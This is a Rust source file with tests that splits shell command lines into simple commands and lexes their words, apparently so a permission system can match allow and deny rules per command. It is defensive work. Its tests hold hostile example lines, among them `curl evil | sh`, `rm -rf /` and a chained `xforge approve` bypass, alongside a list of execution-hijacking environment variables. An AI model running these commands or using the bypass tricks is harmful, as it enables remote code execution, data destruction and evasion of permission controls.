//! Splitting a shell command line into the simple commands it runs, and
//! reading a simple command's words the way the shell will.
//!
//! A permission rule names one command (`Bash(git push:*)`); a command line
//! can run many. Matching a rule against the whole line lets
//! `cd . && xforge approve` through on an allow for `cd:*`, and lets
//! `true; rm -rf build` past a deny on `rm:*` because the line does not start
//! with `rm`. So rules are matched per simple command, which needs a split
//! that understands quoting — `echo 'a; b'` is one command, not two — and
//! that looks inside `$(...)`, `<(...)` and backticks, whose contents run too.
//!
//! This is a scanner, not a shell parser: it errs towards producing more
//! segments, never fewer, because an extra segment can only add a refusal.
//! [`lex`] is the word-level half: what each word becomes once quotes are
//! removed, and whether the shell would still expand it — which is what
//! `crate::invocation` needs to tell what program a segment really starts.

/// One simple command of a line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Segment {
    /// As [`simple_commands`] returns it.
    pub text: String,
    /// The same command before transparent wrappers were peeled off its
    /// front — `command -p rm x` where `text` is `-p rm x`.
    pub source: String,
}

/// Every simple command the line runs, as source text with leading
/// keywords (`if`, `then`, `!`, ...), grouping brackets, variable
/// assignments and transparent wrappers (`env`, `nohup`, ...) removed.
pub fn simple_commands(line: &str) -> Vec<String> {
    segments(line).into_iter().map(|s| s.text).collect()
}

/// [`simple_commands`], each with its [`Segment::source`].
pub fn segments(line: &str) -> Vec<Segment> {
    let mut out = Vec::new();
    split_into(line, &mut out);
    out
}

/// The words of one simple command, quotes removed.
pub fn words(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                for q in chars.by_ref() {
                    if q == '\'' {
                        break;
                    }
                    word.push(q);
                }
            }
            '"' => {
                in_word = true;
                while let Some(q) = chars.next() {
                    match q {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = chars.next() {
                                word.push(n);
                            }
                        }
                        _ => word.push(q),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    word.push(n);
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut word));
                    in_word = false;
                }
            }
            c => {
                in_word = true;
                word.push(c);
            }
        }
    }
    if in_word {
        out.push(word);
    }
    out
}

/// One word of a simple command as the shell reads it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Word {
    /// The word with quotes and escapes removed.
    pub text: String,
    /// A redirection operator (`>`, `2>>`, `<`, `&>`, `<<<`, ...). The word
    /// after it is its target.
    pub redirect: bool,
    /// Holds a `$name`, `${...}`, `$(...)`, `$'...'` or a backquote outside
    /// single quotes: its value is only known once the line runs.
    pub substitutes: bool,
    /// Starts with an unquoted `~`, which the shell replaces with a home
    /// directory — `$HOME`'s, whatever the line set it to.
    pub tilde: bool,
    /// Holds an unquoted `*`, `?` or `[`.
    pub globs: bool,
    /// Holds an unquoted `{` or `}`.
    pub braces: bool,
    /// Holds an unquoted `(` or `)`.
    pub parens: bool,
    /// Any part of it was quoted or escaped.
    pub quoted: bool,
}

impl Word {
    /// An unquoted word with no expansion in it.
    pub fn plain(text: impl Into<String>) -> Self {
        let text = text.into();
        Self {
            globs: text.contains(['*', '?', '[']),
            text,
            ..Self::default()
        }
    }

    /// Nothing in it is left for the shell to expand.
    pub fn is_literal(&self) -> bool {
        !(self.substitutes || self.tilde || self.globs || self.braces || self.parens)
    }
}

/// The words of one simple command, redirection operators split out as
/// words of their own: `rm>/dev/null x` is `rm`, `>`, `/dev/null`, `x`.
pub fn lex(command: &str) -> Vec<Word> {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::new();
    let mut word = Word::default();
    let mut started = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            c if c.is_whitespace() => end_word(&mut out, &mut word, &mut started),
            '\'' => {
                started = true;
                word.quoted = true;
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    word.text.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                started = true;
                word.quoted = true;
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    match chars[i] {
                        '\\' if matches!(chars.get(i + 1), Some('$' | '`' | '"' | '\\' | '\n')) => {
                            i += 1;
                            if chars[i] != '\n' {
                                word.text.push(chars[i]);
                            }
                        }
                        '$' if expands_at(&chars, i + 1) => {
                            word.substitutes = true;
                            word.text.push('$');
                        }
                        '`' => {
                            word.substitutes = true;
                            word.text.push('`');
                        }
                        q => word.text.push(q),
                    }
                    i += 1;
                }
            }
            '\\' => {
                started = true;
                word.quoted = true;
                if let Some(&n) = chars.get(i + 1) {
                    if n != '\n' {
                        word.text.push(n);
                    }
                    i += 1;
                }
            }
            '$' if matches!(chars.get(i + 1), Some('\'' | '"')) || expands_at(&chars, i + 1) => {
                started = true;
                word.substitutes = true;
                word.text.push('$');
            }
            '`' => {
                started = true;
                word.substitutes = true;
                word.text.push('`');
            }
            '<' | '>' => {
                let fd = started
                    && !word.quoted
                    && !word.text.is_empty()
                    && word.text.chars().all(|d| d.is_ascii_digit());
                let mut op = if fd {
                    started = false;
                    std::mem::take(&mut word).text
                } else {
                    end_word(&mut out, &mut word, &mut started);
                    String::new()
                };
                op.push(c);
                i = take_operator_tail(&chars, i, &mut op);
                out.push(Word {
                    text: op,
                    redirect: true,
                    ..Word::default()
                });
            }
            '&' if chars.get(i + 1) == Some(&'>') => {
                end_word(&mut out, &mut word, &mut started);
                let mut op = String::from("&>");
                i += 1;
                if chars.get(i + 1) == Some(&'>') {
                    op.push('>');
                    i += 1;
                }
                out.push(Word {
                    text: op,
                    redirect: true,
                    ..Word::default()
                });
            }
            '~' if !started => {
                started = true;
                word.tilde = true;
                word.text.push('~');
            }
            c => {
                started = true;
                match c {
                    '*' | '?' | '[' => word.globs = true,
                    '{' | '}' => word.braces = true,
                    '(' | ')' => word.parens = true,
                    _ => {}
                }
                word.text.push(c);
            }
        }
        i += 1;
    }
    end_word(&mut out, &mut word, &mut started);
    out
}

fn end_word(out: &mut Vec<Word>, word: &mut Word, started: &mut bool) {
    if *started {
        out.push(std::mem::take(word));
    }
    *started = false;
}

/// Whether a `$` followed by `chars[i]` starts an expansion rather than
/// standing for itself.
fn expands_at(chars: &[char], i: usize) -> bool {
    chars.get(i).is_some_and(|&c| {
        c.is_ascii_alphanumeric()
            || matches!(c, '_' | '{' | '(' | '?' | '#' | '@' | '*' | '!' | '$' | '-')
    })
}

/// Extend the redirection operator `op`, whose first character is at
/// `chars[i]`, by the characters that belong to it; returns the index of
/// its last character.
fn take_operator_tail(chars: &[char], mut i: usize, op: &mut String) -> usize {
    let tails: &[&str] = if chars[i] == '>' {
        &[">", "&", "|"]
    } else {
        &["<<", "<-", "<", ">", "&"]
    };
    for tail in tails {
        let n = tail.chars().count();
        if chars
            .get(i + 1..i + 1 + n)
            .is_some_and(|s| s.iter().copied().eq(tail.chars()))
        {
            op.push_str(tail);
            i += n;
            break;
        }
    }
    i
}

fn split_into(src: &str, out: &mut Vec<Segment>) {
    let chars: Vec<char> = src.chars().collect();
    let mut current = String::new();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\\' => {
                current.push(c);
                if let Some(&n) = chars.get(i + 1) {
                    current.push(n);
                }
                i += 2;
                continue;
            }
            '\'' => {
                let end = find_char(&chars, i + 1, '\'');
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '"' => {
                let end = scan_double_quoted(&chars, i + 1, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '`' => {
                let end = find_unescaped(&chars, i + 1, '`');
                let inner: String = chars[i + 1..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '$' | '<' | '>' if chars.get(i + 1) == Some(&'(') => {
                let end = find_close_paren(&chars, i + 2);
                let inner: String = chars[i + 2..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                current.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end + 1;
                continue;
            }
            '#' if current.is_empty() || current.ends_with(char::is_whitespace) => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
                continue;
            }
            ';' | '\n' | '|' => {
                push_command(&current, out);
                current.clear();
            }
            '&' => {
                let redirect =
                    current.trim_end().ends_with(['>', '<']) || chars.get(i + 1) == Some(&'>');
                if redirect {
                    current.push(c);
                } else {
                    push_command(&current, out);
                    current.clear();
                }
            }
            _ => current.push(c),
        }
        i += 1;
    }
    push_command(&current, out);
}

/// Scan a double-quoted string starting just past its opening quote,
/// splitting any substitution inside it into `out`; returns the index of
/// the closing quote.
fn scan_double_quoted(chars: &[char], mut i: usize, out: &mut Vec<Segment>) -> usize {
    while i < chars.len() {
        match chars[i] {
            '"' => return i,
            '\\' => i += 2,
            '`' => {
                let end = find_unescaped(chars, i + 1, '`');
                let inner: String = chars[i + 1..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                i = end + 1;
            }
            '$' if chars.get(i + 1) == Some(&'(') => {
                let end = find_close_paren(chars, i + 2);
                let inner: String = chars[i + 2..end.min(chars.len())].iter().collect();
                split_into(&inner, out);
                i = end + 1;
            }
            _ => i += 1,
        }
    }
    chars.len()
}

fn find_char(chars: &[char], from: usize, target: char) -> usize {
    (from..chars.len())
        .find(|&j| chars[j] == target)
        .unwrap_or(chars.len())
}

fn find_unescaped(chars: &[char], mut i: usize, target: char) -> usize {
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 2,
            c if c == target => return i,
            _ => i += 1,
        }
    }
    chars.len()
}

/// Index of the `)` closing a group whose body starts at `i`.
fn find_close_paren(chars: &[char], mut i: usize) -> usize {
    let mut depth = 1;
    while i < chars.len() {
        match chars[i] {
            '\\' => i += 1,
            '\'' => i = find_char(chars, i + 1, '\''),
            '"' => i = find_unescaped(chars, i + 1, '"'),
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
            }
            _ => {}
        }
        i += 1;
    }
    chars.len()
}

/// Every `NAME=value` assignment made at a command position in `line`, with
/// the value's quotes removed. A leading assignment (`PATH=. ls`), a chain of
/// them (`A=1 B=2 cmd`) and a segment that is only an assignment (`CDPATH=/`)
/// all contribute; an `=` inside an argument (`cmd --opt=v`) does not, because
/// it is not at a command position. What the shell would still expand in the
/// value (`$X`, `~`) is left in the text — the caller that reads a path out of
/// it treats an unexpanded value as reaching anywhere, as it must.
pub fn assignments(line: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for seg in raw_command_segments(line) {
        for word in words(&seg) {
            if let Some(pair) = leading_assignment(&word) {
                out.push(pair);
            } else if WRAPPERS.contains(&word.as_str())
                || PREFIX_KEYWORDS.contains(&word.as_str())
                || word == "{"
                || word.starts_with('-')
            {
                // `env`/`command`/… and their options sit before the
                // assignments they pass on (`env PATH=. ls`), and a keyword
                // before the assignments of the command it opens
                // (`if PATH=. ls`); step over them.
                continue;
            } else {
                break;
            }
        }
    }
    out
}

/// Variables whose assignment changes how a later word runs or where a read
/// lands: program lookup and loading, the configuration a reader takes its
/// options from (git's `GIT_CONFIG_*`, `RIPGREP_CONFIG_PATH`, `MANOPT`, a
/// `XDG_CONFIG_HOME` with a `git/config` in it), a pager, browser, editor or
/// askpass helper it shells out to (`HOMEBREW_BROWSER`, `SSH_ASKPASS`), and
/// the directories `cd` and `~` resolve against.
const DANGEROUS_VARIABLE_NAMES: &[&str] = &[
    "PATH",
    "BASH_ENV",
    "ENV",
    "SHELLOPTS",
    "BASHOPTS",
    "PROMPT_COMMAND",
    "IFS",
    "LESSOPEN",
    "LESSCLOSE",
    "MANOPT",
    "MANROFFOPT",
    "MANROFFSEQ",
    "VISUAL",
    "KUBECONFIG",
    "ACKRC",
    "CDPATH",
    "OLDPWD",
    "HOME",
    "PWD",
];

const DANGEROUS_VARIABLE_PREFIXES: &[&str] = &[
    "GIT_",
    "SSH_",
    "LD_",
    "DYLD_",
    "XDG_",
    "GROFF_",
    "DOCKER_",
    "HOMEBREW_",
    "NPM_CONFIG_",
    "PYTHON",
    "PERL",
    "RUBY",
    "NODE_",
    "BAT_",
    "ACK_",
];

const DANGEROUS_VARIABLE_SUFFIXES: &[&str] =
    &["PAGER", "BROWSER", "EDITOR", "_CONFIG_PATH", "_CONFIG_FILE"];

/// Whether setting `name` in front of a command can make it run another
/// program or read somewhere other than it says ([`DANGEROUS_VARIABLE_NAMES`]
/// and the prefixes and suffixes beside it). Case is ignored.
pub fn is_dangerous_variable(name: &str) -> bool {
    let name = name.to_ascii_uppercase();
    DANGEROUS_VARIABLE_NAMES.contains(&name.as_str())
        || DANGEROUS_VARIABLE_PREFIXES
            .iter()
            .any(|p| name.starts_with(p))
        || DANGEROUS_VARIABLE_SUFFIXES
            .iter()
            .any(|s| name.ends_with(s))
}

/// `line` cut at the operators that separate commands (`;`, newline, `|`,
/// `&`, `&&`, `||`), keeping every piece — including one that is only an
/// assignment, which [`segments`] drops. Quotes, escapes and substitutions
/// are stepped over so an operator inside them does not split.
fn raw_command_segments(line: &str) -> Vec<String> {
    let chars: Vec<char> = line.chars().collect();
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut i = 0;
    while i < chars.len() {
        match chars[i] {
            '\\' => {
                cur.push('\\');
                if let Some(&n) = chars.get(i + 1) {
                    cur.push(n);
                    i += 1;
                }
            }
            '\'' => {
                let end = find_char(&chars, i + 1, '\'');
                cur.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end;
            }
            '"' => {
                let end = find_unescaped(&chars, i + 1, '"');
                cur.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end;
            }
            '`' => {
                let end = find_unescaped(&chars, i + 1, '`');
                cur.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end;
            }
            '$' if chars.get(i + 1) == Some(&'(') => {
                let end = find_close_paren(&chars, i + 2);
                cur.extend(&chars[i..(end + 1).min(chars.len())]);
                i = end;
            }
            ';' | '\n' | '|' | '&' => out.push(std::mem::take(&mut cur)),
            c => cur.push(c),
        }
        i += 1;
    }
    out.push(cur);
    out
}

/// A `NAME=value` word at a command position: `Some((name, value))` when the
/// name is a shell-variable name, else `None`.
fn leading_assignment(word: &str) -> Option<(String, String)> {
    let (name, value) = word.split_once('=')?;
    is_assignment(word).then(|| (name.to_string(), value.to_string()))
}

pub(crate) const PREFIX_KEYWORDS: &[&str] =
    &["if", "then", "else", "elif", "do", "while", "until", "!"];
const WRAPPERS: &[&str] = &["time", "nohup", "command", "builtin", "exec", "env"];
const TRAILING_KEYWORDS: &[&str] = &["fi", "done", "esac"];

fn push_command(raw: &str, out: &mut Vec<Segment>) {
    let mut rest = raw.trim();
    let mut wrapper = None;
    let mut source = None;
    loop {
        rest = strip_group_openers(rest);
        let end = first_word_end(rest);
        let first = &rest[..end];
        if first.is_empty() {
            break;
        }
        if WRAPPERS.contains(&first) {
            source.get_or_insert(rest);
            wrapper = Some(first);
        } else if !(PREFIX_KEYWORDS.contains(&first) || is_assignment(first)) {
            break;
        }
        rest = rest[end..].trim_start();
    }
    let rest = strip_group_closers(rest);
    let source = strip_group_closers(source.unwrap_or(rest));
    if TRAILING_KEYWORDS.contains(&rest) {
        return;
    }
    // A bare wrapper is a command in its own right: `env` alone prints the
    // environment.
    let text = match (rest.is_empty(), wrapper) {
        (false, _) => rest,
        (true, Some(w)) => w,
        (true, None) => return,
    };
    out.push(Segment {
        text: text.to_string(),
        source: source.to_string(),
    });
}

/// `(` always opens a subshell; `{` opens a group only as a word of its own —
/// `{rm,x}` is a brace expansion, not a group.
fn strip_group_openers(mut s: &str) -> &str {
    loop {
        s = s.trim_start();
        if let Some(rest) = s.strip_prefix('(') {
            s = rest;
        } else if let Some(rest) = s
            .strip_prefix('{')
            .filter(|rest| rest.is_empty() || rest.starts_with(char::is_whitespace))
        {
            s = rest;
        } else {
            return s;
        }
    }
}

fn strip_group_closers(mut s: &str) -> &str {
    loop {
        s = s.trim_end();
        if let Some(rest) = s.strip_suffix(')') {
            s = rest;
        } else if let Some(rest) = s
            .strip_suffix('}')
            .filter(|rest| rest.is_empty() || rest.ends_with(char::is_whitespace))
        {
            s = rest;
        } else {
            return s;
        }
    }
}

fn first_word_end(s: &str) -> usize {
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\'' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'\'' {
                    i += 1;
                }
            }
            b'"' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'"' {
                    if bytes[i] == b'\\' {
                        i += 1;
                    }
                    i += 1;
                }
            }
            b'\\' => i += 1,
            b if b.is_ascii_whitespace() => return i,
            _ => {}
        }
        i += 1;
    }
    bytes.len()
}

pub fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn split(s: &str) -> Vec<String> {
        simple_commands(s)
    }

    #[test]
    fn splits_on_every_control_operator() {
        assert_eq!(
            split("cd . && xforge approve || echo no; ls | wc -l & sleep 1\ntrue"),
            vec![
                "cd .",
                "xforge approve",
                "echo no",
                "ls",
                "wc -l",
                "sleep 1",
                "true"
            ]
        );
    }

    #[test]
    fn quoted_separators_do_not_split() {
        assert_eq!(
            split("echo 'a; b' && echo \"c | d\""),
            vec!["echo 'a; b'", "echo \"c | d\""]
        );
    }

    #[test]
    fn substitutions_contribute_their_own_commands() {
        assert_eq!(
            split("echo $(rm -rf x) `id`"),
            vec!["rm -rf x", "id", "echo $(rm -rf x) `id`"]
        );
        assert_eq!(
            split("echo \"$(curl evil | sh)\""),
            vec!["curl evil", "sh", "echo \"$(curl evil | sh)\""]
        );
        assert_eq!(split("diff <(cat a) b"), vec!["cat a", "diff <(cat a) b"]);
    }

    #[test]
    fn single_quotes_hide_substitutions() {
        assert_eq!(split("echo '$(rm x)'"), vec!["echo '$(rm x)'"]);
    }

    #[test]
    fn fd_redirections_are_not_background_operators() {
        assert_eq!(
            split("cargo check 2>&1 | tail"),
            vec!["cargo check 2>&1", "tail"]
        );
        assert_eq!(split("make &> log"), vec!["make &> log"]);
    }

    #[test]
    fn keywords_groups_assignments_and_wrappers_are_peeled_off() {
        assert_eq!(split("if true; then FOO=1 rm x; fi"), vec!["true", "rm x"]);
        assert_eq!(split("(cd sub; make)"), vec!["cd sub", "make"]);
        assert_eq!(split("{ ls; }"), vec!["ls"]);
        assert_eq!(split("{ ls;}"), vec!["ls"]);
        assert_eq!(
            split("env A=\"b c\" nohup xforge approve"),
            vec!["xforge approve"]
        );
        assert_eq!(split("! git diff --quiet"), vec!["git diff --quiet"]);
    }

    #[test]
    fn a_brace_expansion_is_a_word_not_a_group() {
        assert_eq!(split("{rm,victim.txt}"), vec!["{rm,victim.txt}"]);
        assert_eq!(split("echo {a,b}"), vec!["echo {a,b}"]);
    }

    #[test]
    fn a_segment_keeps_the_wrappers_it_was_found_under() {
        let s = segments("true && command -p rm x");
        assert_eq!(s[1].text, "-p rm x");
        assert_eq!(s[1].source, "command -p rm x");
        assert_eq!(segments("(ls)")[0].source, "ls");
    }

    #[test]
    fn a_bare_wrapper_is_still_a_command() {
        assert_eq!(split("ls; env"), vec!["ls", "env"]);
        assert_eq!(split("FOO=1 env"), vec!["env"]);
    }

    #[test]
    fn an_assignment_after_a_keyword_is_still_an_assignment() {
        for line in [
            "if PATH=. ls; then ls; fi",
            "if PATH=.; then ls; fi",
            "! PATH=. ls",
        ] {
            assert!(
                assignments(line).iter().any(|(name, _)| name == "PATH"),
                "{line}"
            );
        }
    }

    #[test]
    fn comments_are_dropped() {
        assert_eq!(split("ls # ; rm -rf /"), vec!["ls"]);
        assert_eq!(split("echo a#b"), vec!["echo a#b"]);
    }

    #[test]
    fn words_strip_quotes_and_escapes() {
        assert_eq!(
            words(r#"cat "a b" 'c d' e\ f"#),
            vec!["cat", "a b", "c d", "e f"]
        );
    }

    fn texts(command: &str) -> Vec<String> {
        lex(command).into_iter().map(|w| w.text).collect()
    }

    #[test]
    fn lexing_removes_quotes_the_way_the_shell_does() {
        assert_eq!(texts(r#""rm" \rm r''m "r"m"#), vec!["rm"; 4]);
        assert_eq!(texts(r#"echo "a\b" "\$x""#), vec!["echo", r"a\b", "$x"]);
    }

    #[test]
    fn redirections_are_words_of_their_own() {
        assert_eq!(
            texts("rm>/dev/null x 2>>log <in &>all"),
            vec![
                "rm",
                ">",
                "/dev/null",
                "x",
                "2>>",
                "log",
                "<",
                "in",
                "&>",
                "all"
            ]
        );
        let words = lex("a 2>&1");
        assert!(words[1].redirect && words[1].text == "2>&");
        assert!(!lex("'2'>x")[0].redirect);
    }

    #[test]
    fn what_the_shell_would_still_expand_is_marked() {
        let w = |s: &str| lex(s).remove(0);
        assert!(w("$HOME/x").substitutes);
        assert!(w("\"${D}\"/x").substitutes);
        assert!(w("$'\\x72m'").substitutes);
        assert!(w("`id`").substitutes);
        assert!(!w("'$HOME'").substitutes);
        assert!(!w("foo$").substitutes);
        assert!(!w("\"foo$\"").substitutes);
        assert!(w("~/x").tilde);
        assert!(!w("'~'/x").tilde);
        assert!(!w("a~b").tilde);
        assert!(w("/bin/r?").globs);
        assert!(w("{rm,x}").braces);
        assert!(w("f()").parens);
        assert!(w("plain").is_literal());
    }
}
